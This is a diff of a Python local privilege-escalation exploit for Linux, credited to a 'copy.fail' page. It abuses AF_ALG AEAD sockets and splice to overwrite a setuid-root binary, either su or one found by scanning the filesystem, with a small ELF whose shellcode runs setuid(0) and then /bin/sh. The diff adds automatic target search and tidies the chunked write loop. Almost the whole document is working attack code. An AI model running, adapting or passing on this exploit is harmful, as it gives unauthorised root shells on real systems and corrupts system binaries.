@@ -1,71 +1,78 @@
-#!/usr/bin/python3.14
+#!/usr/bin/env python3.14
+import contextlib
+import itertools
 import os
-import sys
+import stat
 import socket
-from socket import AF_ALG, ALG_SET_AEAD_AUTHSIZE, MSG_MORE,  SOCK_SEQPACKET,  SOL_ALG
+from socket import AF_ALG, ALG_SET_AEAD_ASSOCLEN, ALG_SET_AEAD_AUTHSIZE, ALG_SET_IV, ALG_SET_OP, MSG_MORE,  SOCK_SEQPACKET,  SOL_ALG
 
 """
 https://copy.fail/#exploit
 """
 
-PYTHON = sys.executable
-PAYLOAD = ""
-TARGET = "/usr/bin/su"
+DEFAULT_TARGET = "/usr/bin/su"
+
+def find_targets(*, fast: bool= False) -> list[str]:
+    targets = []
+
+    print("finding targets:")
+    print(f"{'permissions':<12} {'owner':<8} {'path'}")
+    for root, dirs, files in os.walk("/"):
+        for name in files:
+            file_path = os.path.join(root, name)
+            with contextlib.suppress(PermissionError, FileNotFoundError):
+                info = os.stat(file_path)
+                if info.st_uid != 0:
+                    continue
+                if not (info.st_mode & stat.S_ISUID):
+                    continue
+
+                mode_str = stat.filemode(info.st_mode)
+                print(f"{mode_str:<12} root     {file_path}")
+                if fast:
+                    return [file_path]
+                targets.append(file_path)
+    
+    return targets
+
 
 def decode(x):
     return bytes.fromhex(x)
 
-def c(f, t, c):
-    a=socket.socket(AF_ALG,  SOCK_SEQPACKET,  0)
-    a.bind(("aead",  "authencesn(hmac(sha256),cbc(aes))"))
-    a.setsockopt(SOL_ALG, socket.ALG_SET_KEY, decode('0800010000000010'+'0'*64))
-    a.setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, None, 4)
-    u, _=a.accept()
-    o=t+4
-    i=decode('00')
-    u.sendmsg(
-        [b"A"*4+c],
-        [(SOL_ALG, 3, i*4), (SOL_ALG, 2, b'\x10'+i*19), (SOL_ALG, 4, b'\x08'+i*3), ],
+def write_payload_chunk_to_target(fd, chunk_offset, chunk_data):
+    sock=socket.socket(AF_ALG,  SOCK_SEQPACKET,  0)
+    sock.bind(("aead",  "authencesn(hmac(sha256),cbc(aes))"))
+    sock.setsockopt(SOL_ALG, socket.ALG_SET_KEY, decode('0800010000000010'+'0'*64))
+    sock.setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, None, 4)
+    conn, _addr =sock.accept()
+
+    o = chunk_offset+4
+    i = decode('00')
+    conn.sendmsg(
+        [b"A"* 4 + chunk_data],
+        [
+            (SOL_ALG, ALG_SET_OP, i * 4),
+            (SOL_ALG, ALG_SET_IV, b'\x10'+ i *19),
+            (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, b'\x08'+ i * 3)
+        ],
         MSG_MORE
     )
-    r, w =os.pipe()
-    os.splice(f, w, o, offset_src=0)
-    os.splice(r, u.fileno(), o)
+    r, w = os.pipe()
+    os.splice(fd, w, o, offset_src=0)
+    os.splice(r, conn.fileno(), o)
     try:
-       u.recv(8+t)
+       conn.recv(8+chunk_offset)
     except:
        pass
 
     os.close(r)
     os.close(w)
 
-f=os.open(TARGET, 0)
-i=0
-
-def make_python_payload():
-    with open(PAYLOAD, "w+") as payload:
-        payload.write(f"""#!{PYTHON}
-    import sys
-    import os
-    args = sys.argv
-    print("in exploit")
-
-    if os.getuid() != 0:
-        print("not root")
-        exit()
-    else:
-        print("im root")
-                    
-    with open("/home/aidan/test", "w+") as f:
-        f.write(str(args))
-    """)
-    os.chmod(PAYLOAD, 0o755)
-
 
 def make_setuid_code(command: str) -> bytes:
 
     stuid = decode("31c031ffb0690f05")
-    # addr is rip+0xf
+    # addr is rip+0xf (after the exit_call)
     execv = decode("488d3d0f00000031f66a3b58990f05")
     exit_call = decode("31ff6a3c580f05")
 
@@ -73,26 +80,20 @@ def make_setuid_code(command: str) -> bytes:
     null = decode("000000")
     return stuid + execv + exit_call + target + null
 
-def make_crash_code() -> bytes:
-    # amd
-    amd_code = "0F01D1"
-    # intel
-    intel_code = "0f01c1"
-    return decode(amd_code)
 
-
-def make_payload(command: str):
+def make_payload(execv: str):
     elf = decode("7f454c4602010100000000000000000002003e00010000007800400000000000400000000000000000000000000000000000000040003800010000000000000001000000050000000000000000000000000040000000000000004000000000009e000000000000009e000000000000000010000000000000")
     
-    prog = make_setuid_code(command)
-    # prog = make_crash_code()
+    prog = make_setuid_code(execv)
     return elf + prog
 
-payload = make_payload("/bin/sh")
 
-while i<len(payload):
-    c(f, i, payload[i:i+4])
-    i+=4
+payload = make_payload(execv="/bin/sh")
+target = next(iter(find_targets(fast=True)), None) or DEFAULT_TARGET
+fd=os.open(target, 0)
 
-print("running exploit")
-os.system(TARGET)
+for i, chunk in enumerate(itertools.batched(payload, n=4)):
+    write_payload_chunk_to_target(fd, i * 4, bytes(chunk))
+
+print("running exploit on", target)
+os.system(target)
